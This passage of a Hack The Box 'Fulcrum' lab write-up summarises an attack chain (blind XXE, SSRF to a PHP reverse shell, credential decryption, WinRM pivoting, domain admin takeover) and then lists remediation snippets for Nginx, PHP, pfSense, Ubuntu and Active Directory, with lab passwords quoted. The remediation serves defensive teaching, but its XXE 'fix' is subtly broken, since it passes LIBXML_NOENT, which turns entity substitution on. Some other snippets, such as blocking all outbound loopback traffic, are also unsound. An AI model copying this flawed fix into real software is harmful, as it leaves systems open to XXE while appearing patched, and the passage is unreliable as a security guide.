</span></span><span style=display:flex><span>mount /dev/nbd1p1 /mnt
</span></span></code></pre></div></li><li>Found <code>root.txt</code> on the domain controller and <code>user.txt</code> in the <code>btables</code> directory on the file server.</li></ul></li></ul><hr><h3 id=summary-of-key-techniques>Summary of Key Techniques<a href=#summary-of-key-techniques class=hanchor arialabel=Anchor>#</a></h3><ol><li><strong>Nmap Scanning</strong>: Identified open ports and services.</li><li><strong>Web Enumeration</strong>: Discovered PHP files and potential vulnerabilities.</li><li><strong>Blind XXE</strong>: Exploited API endpoint to read files and confirm vulnerabilities.</li><li><strong>Python Automation</strong>: Streamlined XXE exploitation for file retrieval.</li><li><strong>SSRF to RFI</strong>: Chained XXE to execute a PHP reverse shell.</li><li><strong>File System Enumeration</strong>: Found PowerShell scripts and VM infrastructure.</li><li><strong>PowerShell Decryption</strong>: Decrypted credentials for further access.</li><li><strong>WinRM Pivoting</strong>: Accessed internal Windows servers via Ruby WinRM script.</li><li><strong>Active Directory Enumeration</strong>: Used PowerView to identify active accounts and credentials.</li><li><strong>File Server Access</strong>: Leveraged <code>btables</code> credentials for shell access.</li><li><strong>Netlogon Credential Harvesting</strong>: Found domain admin credentials in scripts.</li><li><strong>Domain Controller Access</strong>: Chained commands to gain domain admin access.</li><li><strong>Kernel Exploit (Unintended)</strong>: Escalated to root and extracted flags from VMDK files.</li></ol><p>This sequence reflects the complex, multi-stage attack path to compromise the Fulcrum machine, highlighting both the intended Active Directory exploitation chain and the unintended kernel exploit path.</p><h2 id=security-gaps-and-remediation>Security Gaps and Remediation<a href=#security-gaps-and-remediation class=hanchor arialabel=Anchor>#</a></h2><p>Below is a detailed analysis of the security gaps identified in the services and systems of the &ldquo;Fulcrum&rdquo; machine from Hack The Box, as described in the provided data. Each gap is associated with a specific service or system, and recommendations are provided for fixing these issues through source code or configuration changes. The gaps are organized by the affected service or system, with a focus on actionable fixes to prevent the exploited vulnerabilities.</p><hr><h3 id=1-nginx-web-server-port-80>1. Nginx Web Server (Port 80)<a href=#1-nginx-web-server-port-80 class=hanchor arialabel=Anchor>#</a></h3><p><strong>Service</strong>: Nginx 1.10.3 running on Ubuntu, hosting a PHP application</p><h4 id=gap-1-server-side-request-forgery-ssrf-via-php-application>Gap 1: Server-Side Request Forgery (SSRF) via PHP Application<a href=#gap-1-server-side-request-forgery-ssrf-via-php-application class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: The PHP application on port 80 (<code>index.php</code>) allowed Server-Side Request Forgery (SSRF) when combined with an XXE vulnerability, enabling the server to fetch and execute remote PHP files (Remote File Inclusion, RFI).</li><li><strong>Impact</strong>: Attackers gained a reverse shell as the <code>www-data</code> user by including a malicious PHP file.</li><li><strong>Fix</strong>:<ul><li><strong>Source Code Fix</strong>:<ul><li>Validate and sanitize the <code>page</code> parameter in <code>index.php</code> to prevent inclusion of external URLs. Use a whitelist of allowed local PHP files:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$allowed_pages <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;home.php&#39;</span>, <span style=color:#e6db74>&#39;upload.php&#39;</span>, <span style=color:#e6db74>&#39;index.php&#39;</span>];
</span></span><span style=display:flex><span>$page <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;page&#39;</span>] <span style=color:#f92672>??</span> <span style=color:#e6db74>&#39;home&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>in_array</span>($page <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;.php&#39;</span>, $allowed_pages)) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;Invalid page&#39;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span> $page <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;.php&#39;</span>;
</span></span></code></pre></div></li><li>Disable URL inclusion by setting <code>allow_url_include=Off</code> in the PHP configuration (already default in most PHP versions, but verify).</li></ul></li><li><strong>Configuration Fix</strong>:<ul><li>Configure Nginx to restrict access to sensitive PHP files or endpoints. For example, add a location block to deny direct access to unintended PHP files:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nginx data-lang=nginx><span style=display:flex><span><span style=color:#66d9ef>location</span> ~<span style=color:#e6db74>*</span> <span style=color:#e6db74>^/(index|home|upload)\.php</span>$ {
</span></span><span style=display:flex><span>    <span style=color:#f92672>allow</span> <span style=color:#e6db74>all</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>location</span> ~<span style=color:#e6db74>*</span> <span style=color:#e6db74>\.php</span>$ {
</span></span><span style=display:flex><span>    <span style=color:#f92672>deny</span> <span style=color:#e6db74>all</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></li><li>Implement a Web Application Firewall (WAF) to block requests containing external URLs in query parameters.</li><li>Ensure <code>open_basedir</code> is set in <code>php.ini</code> to restrict PHP file access to a specific directory:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ini data-lang=ini><span style=display:flex><span><span style=color:#a6e22e>open_basedir</span><span style=color:#f92672>=</span><span style=color:#e6db74>/var/www/html</span>
</span></span></code></pre></div></li></ul></li></ul></li></ul><h4 id=gap-2-misleading-error-message-microsoft-net-on-ubuntu>Gap 2: Misleading Error Message (Microsoft .NET on Ubuntu)<a href=#gap-2-misleading-error-message-microsoft-net-on-ubuntu class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: The Nginx server displayed a Microsoft .NET error message despite running on Ubuntu, indicating a misconfiguration or intentional misdirection that could confuse attackers but also signals poor configuration hygiene.</li><li><strong>Impact</strong>: While not directly exploitable, this misconfiguration could obscure legitimate debugging efforts and indicate other underlying issues.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>:<ul><li>Remove or correct the misconfigured error page to reflect the actual server environment (Nginx on Ubuntu). Update the Nginx configuration to serve appropriate error pages:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nginx data-lang=nginx><span style=display:flex><span><span style=color:#66d9ef>error_page</span> <span style=color:#ae81ff>500</span> <span style=color:#ae81ff>502</span> <span style=color:#ae81ff>503</span> <span style=color:#ae81ff>504</span> <span style=color:#e6db74>/custom_error.html</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>location</span> = <span style=color:#e6db74>/custom_error.html</span> {
</span></span><span style=display:flex><span>    <span style=color:#f92672>root</span> <span style=color:#e6db74>/var/www/html</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>internal</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></li><li>Verify that no unintended frameworks (e.g., .NET) are referenced in the application or server configuration.</li></ul></li></ul></li></ul><hr><h3 id=2-custom-api-port-9999>2. Custom API (Port 9999)<a href=#2-custom-api-port-9999 class=hanchor arialabel=Anchor>#</a></h3><p><strong>Service</strong>: Custom API with &ldquo;Fulcrum API beta&rdquo; header</p><h4 id=gap-3-blind-xml-external-entity-xxe-injection>Gap 3: Blind XML External Entity (XXE) Injection<a href=#gap-3-blind-xml-external-entity-xxe-injection class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: The API endpoint on port 9999 processed XML input without proper validation, allowing blind XXE attacks to read local files (e.g., <code>/etc/passwd</code>) and perform SSRF to access internal services.</li><li><strong>Impact</strong>: Attackers extracted sensitive files and chained XXE with SSRF to achieve remote code execution.</li><li><strong>Fix</strong>:<ul><li><strong>Source Code Fix</strong>:<ul><li>Disable XML external entity processing in the API&rsquo;s XML parser. For PHP, if using <code>libxml</code>, explicitly disable external entities:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>libxml_disable_entity_loader</span>(<span style=color:#66d9ef>true</span>);
</span></span><span style=display:flex><span>$xml <span style=color:#f92672>=</span> <span style=color:#a6e22e>simplexml_load_string</span>($input, <span style=color:#e6db74>&#39;SimpleXMLElement&#39;</span>, <span style=color:#a6e22e>LIBXML_NOENT</span>);
</span></span></code></pre></div></li><li>Use a whitelist for expected XML input formats and reject malformed or unexpected XML payloads:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/&lt;heartbeat&gt;.*&lt;\/heartbeat&gt;/&#39;</span>, $input)) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;Invalid XML format&#39;</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></li><li>Avoid processing user-supplied XML unless absolutely necessary; prefer JSON or other safer formats for API input.</li></ul></li><li><strong>Configuration Fix</strong>:<ul><li>Implement a WAF to detect and block XML payloads containing <code>&lt;!ENTITY</code> or other XXE indicators.</li><li>Restrict outbound network connections from the API server to prevent SSRF. Use a firewall rule to block requests to <code>localhost</code> or internal IPs:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>iptables -A OUTPUT -d 127.0.0.1 -j DROP
</span></span><span style=display:flex><span>iptables -A OUTPUT -d 192.168.0.0/16 -j DROP
</span></span></code></pre></div></li></ul></li></ul></li></ul><hr><h3 id=3-phpmyadmin-port-88>3. PHPMyAdmin (Port 88)<a href=#3-phpmyadmin-port-88 class=hanchor arialabel=Anchor>#</a></h3><p><strong>Service</strong>: PHPMyAdmin instance</p><h4 id=gap-4-exposed-phpmyadmin-with-potential-lockout-mechanism>Gap 4: Exposed PHPMyAdmin with Potential Lockout Mechanism<a href=#gap-4-exposed-phpmyadmin-with-potential-lockout-mechanism class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: PHPMyAdmin was accessible on port 88 but returned error messages even with correct credentials, suggesting a misconfiguration or lockout mechanism that could be bypassed or exploited.</li><li><strong>Impact</strong>: While not directly exploited, an exposed PHPMyAdmin instance is a high-risk target for brute-force or authentication bypass attacks.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>:<ul><li>Restrict access to PHPMyAdmin by IP address in the Nginx configuration:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nginx data-lang=nginx><span style=display:flex><span><span style=color:#66d9ef>location</span> <span style=color:#e6db74>/phpmyadmin</span> {
</span></span><span style=display:flex><span>    <span style=color:#f92672>allow</span> 192.168.1.0<span style=color:#e6db74>/24</span>; <span style=color:#75715e># Internal admin network
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#f92672>deny</span> <span style=color:#e6db74>all</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></li><li>Enable strong authentication (e.g., HTTP Basic Auth) for PHPMyAdmin:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nginx data-lang=nginx><span style=display:flex><span><span style=color:#66d9ef>location</span> <span style=color:#e6db74>/phpmyadmin</span> {
</span></span><span style=display:flex><span>    <span style=color:#f92672>auth_basic</span> <span style=color:#e6db74>&#34;Restricted</span> <span style=color:#e6db74>Access&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>auth_basic_user_file</span> <span style=color:#e6db74>/etc/nginx/.htpasswd</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div>Generate the <code>.htpasswd</code> file:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>htpasswd -c /etc/nginx/.htpasswd admin
</span></span></code></pre></div></li><li>Ensure the lockout mechanism is properly configured with a reasonable threshold and reset period to prevent brute-force attacks without locking out legitimate users.</li><li>Consider removing PHPMyAdmin from public-facing servers unless absolutely necessary, or use a VPN for access.</li></ul></li></ul></li></ul><hr><h3 id=4-pfsense-interface-port-9001>4. pfSense Interface (Port 9001)<a href=#4-pfsense-interface-port-9001 class=hanchor arialabel=Anchor>#</a></h3><p><strong>Service</strong>: pfSense administrative interface</p><h4 id=gap-5-exposed-pfsense-interface-with-weak-lockout-mechanism>Gap 5: Exposed pfSense Interface with Weak Lockout Mechanism<a href=#gap-5-exposed-pfsense-interface-with-weak-lockout-mechanism class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: The pfSense interface was accessible on port 9001, with a lockout mechanism that prevented brute-forcing default credentials (<code>admin:pfSense</code>). However, its exposure on a public-facing port is a significant risk.</li><li><strong>Impact</strong>: Potential for brute-force attacks or exploitation of misconfigured access controls.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>:<ul><li>Restrict access to the pfSense interface to specific IP addresses:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span># In pfSense WebGUI: System &gt; Advanced &gt; Admin Access
</span></span><span style=display:flex><span># Set &#34;WebGUI Access&#34; to a specific subnet (e.g., 192.168.1.0/24)
</span></span></code></pre></div></li><li>Disable public access to the pfSense interface by binding it to an internal interface:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span># In pfSense WebGUI: Interfaces &gt; Assign
</span></span><span style=display:flex><span># Bind WebGUI to a management VLAN or internal interface
</span></span></code></pre></div></li><li>Strengthen the lockout mechanism by reducing the number of allowed login attempts and increasing the lockout duration:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span># In pfSense WebGUI: System &gt; User Manager &gt; Settings
</span></span><span style=display:flex><span># Set &#34;Maximum Login Attempts&#34; to 3 and &#34;Lockout Time&#34; to 3600 seconds
</span></span></code></pre></div></li><li>Use strong, unique passwords for pfSense admin accounts and enable two-factor authentication (2FA).</li></ul></li></ul></li></ul><hr><h3 id=5-ubuntu-system-fulcrum-host>5. Ubuntu System (Fulcrum Host)<a href=#5-ubuntu-system-fulcrum-host class=hanchor arialabel=Anchor>#</a></h3><p><strong>System</strong>: Ubuntu Xenial 16.04 (hypervisor hosting VMs)</p><h4 id=gap-6-vulnerable-kernel-privilege-escalation>Gap 6: Vulnerable Kernel (Privilege Escalation)<a href=#gap-6-vulnerable-kernel-privilege-escalation class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: The Ubuntu Xenial 16.04 system was susceptible to a kernel exploit, allowing local privilege escalation to root.</li><li><strong>Impact</strong>: Attackers escalated from <code>www-data</code> to root, accessing sensitive VM files (<code>dc.vmdk</code>, <code>file.vmdk</code>) and extracting flags.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>:<ul><li>Upgrade the kernel to a patched version. For Ubuntu 16.04, apply all security updates:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo apt update <span style=color:#f92672>&amp;&amp;</span> sudo apt full-upgrade
</span></span></code></pre></div></li><li>Reboot the system to ensure the updated kernel is active:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo reboot
</span></span></code></pre></div></li><li>Enable automatic security updates to keep the system patched:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo apt install unattended-upgrades
</span></span><span style=display:flex><span>sudo dpkg-reconfigure --priority<span style=color:#f92672>=</span>low unattended-upgrades
</span></span></code></pre></div></li></ul></li><li><strong>Additional Hardening</strong>:<ul><li>Restrict access to kernel modules by non-root users:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo chmod <span style=color:#ae81ff>700</span> /lib/modules
</span></span></code></pre></div></li><li>Implement kernel hardening with tools like <code>apparmor</code> or <code>selinux</code> to restrict unprivileged access to kernel functions.</li></ul></li></ul></li></ul><h4 id=gap-7-unrestricted-access-to-vmdk-files>Gap 7: Unrestricted Access to VMDK Files<a href=#gap-7-unrestricted-access-to-vmdk-files class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: The <code>www-data</code> user could access VM disk files (<code>/var/lib/libvirt/images/*.vmdk</code>), which contained sensitive data (e.g., <code>root.txt</code>, <code>user.txt</code>).</li><li><strong>Impact</strong>: Attackers mounted VMDK files to extract sensitive data without needing higher privileges.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>:<ul><li>Restrict file permissions on VMDK files to the <code>libvirt-qemu</code> user and group:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo chown libvirt-qemu:libvirt-qemu /var/lib/libvirt/images/*.vmdk
</span></span><span style=display:flex><span>sudo chmod <span style=color:#ae81ff>600</span> /var/lib/libvirt/images/*.vmdk
</span></span></code></pre></div></li><li>Use AppArmor or SELinux to enforce access controls on the <code>libvirt</code> directory, preventing unauthorized access by <code>www-data</code> or other users.</li><li>Encrypt VMDK files or use LUKS encryption for VM storage to prevent direct access to disk contents.</li></ul></li></ul></li></ul><h4 id=gap-8-weak-user-permissions>Gap 8: Weak User Permissions<a href=#gap-8-weak-user-permissions class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: The <code>www-data</code> user had excessive permissions, allowing execution of sensitive operations (e.g., mounting VMDK files after kernel exploit).</li><li><strong>Impact</strong>: Facilitated privilege escalation and access to sensitive system resources.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>:<ul><li>Minimize <code>www-data</code> privileges by running Nginx/PHP-FPM in a restricted environment:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo chown -R www-data:www-data /var/www/html
</span></span><span style=display:flex><span>sudo chmod -R <span style=color:#ae81ff>750</span> /var/www/html
</span></span></code></pre></div></li><li>Use a dedicated user for PHP-FPM with minimal permissions:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span># In /etc/php/7.0/fpm/pool.d/www.conf
</span></span><span style=display:flex><span>user = php-fpm-user
</span></span><span style=display:flex><span>group = php-fpm-group
</span></span></code></pre></div></li><li>Implement a chroot jail or containerization (e.g., Docker) for the web server to isolate it from the host filesystem.</li></ul></li></ul></li></ul><hr><h3 id=6-windows-file-server-filefulcrumlocal>6. Windows File Server (file.fulcrum.local)<a href=#6-windows-file-server-filefulcrumlocal class=hanchor arialabel=Anchor>#</a></h3><p><strong>System</strong>: Windows server hosting file shares</p><h4 id=gap-9-exposed-netlogon-share-with-sensitive-scripts>Gap 9: Exposed Netlogon Share with Sensitive Scripts<a href=#gap-9-exposed-netlogon-share-with-sensitive-scripts class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: The Netlogon share (<code>\\dc.fulcrum.local\netlogon</code>) contained PowerShell scripts with hardcoded credentials (e.g., <code>923a:923a</code>), accessible to domain users.</li><li><strong>Impact</strong>: Attackers extracted domain admin credentials, leading to full domain compromise.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>:<ul><li>Restrict access to the Netlogon share to specific accounts (e.g., administrators only):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># On the domain controller</span>
</span></span><span style=display:flex><span>$acl = Get-Acl <span style=color:#e6db74>&#34;\\dc.fulcrum.local\netlogon&#34;</span>
</span></span><span style=display:flex><span>$acl.SetAccessRuleProtection($true, $false)
</span></span><span style=display:flex><span>$rule = New-Object System.Security.AccessControl.FileSystemAccessRule(<span style=color:#e6db74>&#34;Administrators&#34;</span>, <span style=color:#e6db74>&#34;FullControl&#34;</span>, <span style=color:#e6db74>&#34;Allow&#34;</span>)
</span></span><span style=display:flex><span>$acl.SetAccessRule($rule)
</span></span><span style=display:flex><span>Set-Acl <span style=color:#e6db74>&#34;\\dc.fulcrum.local\netlogon&#34;</span> $acl
</span></span></code></pre></div></li><li>Remove sensitive scripts from the Netlogon share or encrypt credentials using a secure vault solution (e.g., Active Directory&rsquo;s Group Managed Service Accounts).</li></ul></li><li><strong>Source Code Fix</strong>:<ul><li>Avoid hardcoding credentials in scripts. Use secure credential storage (e.g., Windows Credential Manager) or environment variables accessible only to authorized processes.</li><li>Audit and rewrite scripts to use least-privilege accounts for operations.</li></ul></li></ul></li></ul><h4 id=gap-10-weak-passwords-in-scripts>Gap 10: Weak Passwords in Scripts<a href=#gap-10-weak-passwords-in-scripts class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: Scripts contained weak or predictable passwords (e.g., <code>923a:923a</code>, <code>fileserverlogin12345</code>).</li><li><strong>Impact</strong>: Facilitated credential guessing and privilege escalation.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>:<ul><li>Enforce strong password policies via Group Policy:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># On the domain controller</span>
</span></span><span style=display:flex><span>Set-ADDefaultDomainPasswordPolicy -Identity fulcrum.local -MinPasswordLength <span style=color:#ae81ff>14</span> -PasswordHistoryCount <span style=color:#ae81ff>24</span> -ComplexityEnabled $true
</span></span></code></pre></div></li><li>Regularly audit accounts for weak passwords using tools like <code>dsquery</code> or PowerView.</li></ul></li><li><strong>Source Code Fix</strong>:<ul><li>Replace hardcoded passwords with secure credential prompts or API-based authentication mechanisms.</li></ul></li></ul></li></ul><hr><h3 id=7-windows-web-server-19216812228>7. Windows Web Server (192.168.122.28)<a href=#7-windows-web-server-19216812228 class=hanchor arialabel=Anchor>#</a></h3><p><strong>System</strong>: Windows server running WinRM</p><h4 id=gap-11-exposed-winrm-service>Gap 11: Exposed WinRM Service<a href=#gap-11-exposed-winrm-service class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: The WinRM service on port 5986 was accessible via an SSH tunnel, allowing remote code execution with valid credentials.</li><li><strong>Impact</strong>: Attackers gained a shell as <code>web_user</code> on the web server.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>:<ul><li>Restrict WinRM access to specific IP ranges:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>Set-Item WSMan<span style=color:#960050;background-color:#1e0010>:</span>\localhost\Service\AllowUnencrypted $false
</span></span><span style=display:flex><span>Set-Item WSMan<span style=color:#960050;background-color:#1e0010>:</span>\localhost\Service\Auth\Basic $false
</span></span><span style=display:flex><span>New-WSManInstance -ResourceURI winrm/config/Listener -SelectorSet @{Address=<span style=color:#e6db74>&#34;*&#34;</span>;Transport=<span style=color:#e6db74>&#34;HTTPS&#34;</span>} -ValueSet @{AllowedHosts=<span style=color:#e6db74>&#34;192.168.1.0/24&#34;</span>}
</span></span></code></pre></div></li><li>Enable WinRM HTTPS with a valid certificate and disable HTTP access:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>winrm quickconfig -transport:https
</span></span></code></pre></div></li><li>Use Group Policy to enforce WinRM authentication with Kerberos or NTLM and require strong encryption.</li></ul></li></ul></li></ul><hr><h3 id=8-active-directory-fulcrumlocal>8. Active Directory (fulcrum.local)<a href=#8-active-directory-fulcrumlocal class=hanchor arialabel=Anchor>#</a></h3><p><strong>System</strong>: Active Directory domain controller (<code>dc.fulcrum.local</code>)</p><h4 id=gap-12-weak-domain-credentials>Gap 12: Weak Domain Credentials<a href=#gap-12-weak-domain-credentials class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: The <code>ldap</code> account had a weak password (<code>password_for_searching</code>), and the <code>923a</code> account used its username as the password (<code>923a:923a</code>).</li><li><strong>Impact</strong>: Allowed enumeration and escalation to domain admin privileges.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>:<ul><li>Enforce strong password policies across the domain (as above).</li><li>Disable or restrict low-privilege accounts like <code>ldap</code> unless necessary, and use service accounts with limited permissions.</li><li>Implement account lockout policies to prevent brute-forcing:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>Set-ADDefaultDomainPasswordPolicy -Identity fulcrum.local -LockoutThreshold <span style=color:#ae81ff>5</span> -LockoutDuration <span style=color:#ae81ff>30</span> -LockoutObservationWindow <span style=color:#ae81ff>30</span>
</span></span></code></pre></div></li></ul></li><li><strong>Additional Hardening</strong>:<ul><li>Use Privileged Access Management (PAM) solutions to manage and rotate credentials for sensitive accounts.</li><li>Monitor Active Directory for unusual login activity using tools like Microsoft Defender for Identity.</li></ul></li></ul></li></ul><h4 id=gap-13-excessive-permissions-for-domain-users>Gap 13: Excessive Permissions for Domain Users<a href=#gap-13-excessive-permissions-for-domain-users class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: Domain users (e.g., <code>btables</code>) had access to sensitive resources like the Netlogon share, and <code>923a</code> had domain admin privileges unnecessarily.</li><li><strong>Impact</strong>: Allowed escalation to domain admin via credential extraction.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>:<ul><li>Audit and minimize permissions using the principle of least privilege:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># Remove unnecessary group memberships</span>
</span></span><span style=display:flex><span>Remove-ADGroupMember -Identity <span style=color:#e6db74>&#34;Domain Admins&#34;</span> -Members <span style=color:#e6db74>&#34;923a&#34;</span> -Confirm:$false
</span></span></code></pre></div></li><li>Restrict Netlogon share access (as described in Gap 9).</li><li>Use Active Directory delegation to limit user access to specific resources.</li></ul></li></ul></li></ul><hr><h3 id=9-powershell-scripts-general>9. PowerShell Scripts (General)<a href=#9-powershell-scripts-general class=hanchor arialabel=Anchor>#</a></h3><p><strong>System</strong>: PowerShell scripts across Windows servers</p><h4 id=gap-14-hardcoded-credentials-in-scripts>Gap 14: Hardcoded Credentials in Scripts<a href=#gap-14-hardcoded-credentials-in-scripts class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: Multiple PowerShell scripts (e.g., <code>fulcrum_upload_core.ps1</code>, Netlogon scripts) contained hardcoded credentials or secure strings with accessible decryption keys.</li><li><strong>Impact</strong>: Attackers decrypted credentials to access additional systems.</li><li><strong>Fix</strong>:<ul><li><strong>Source Code Fix</strong>:<ul><li>Remove hardcoded credentials and use secure storage (e.g., Windows Credential Manager, Azure Key Vault):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$cred = Get-Credential -Message <span style=color:#e6db74>&#34;Enter credentials&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Use $cred for authentication instead of hardcoded values</span>
</span></span></code></pre></div></li><li>Encrypt sensitive data with DPAPI or secure key management:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$secureString = ConvertTo-SecureString <span style=color:#e6db74>&#34;password&#34;</span> -AsPlainText -Force
</span></span><span style=display:flex><span>$encrypted = $secureString | ConvertFrom-SecureString
</span></span><span style=display:flex><span><span style=color:#75715e># Store $encrypted securely, retrieve with proper access controls</span>
</span></span></code></pre></div></li></ul></li><li><strong>Configuration Fix</strong>:<ul><li>Restrict script execution to authorized users via PowerShell constrained language mode:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$ExecutionContext.SessionState.LanguageMode = <span style=color:#e6db74>&#34;ConstrainedLanguage&#34;</span>
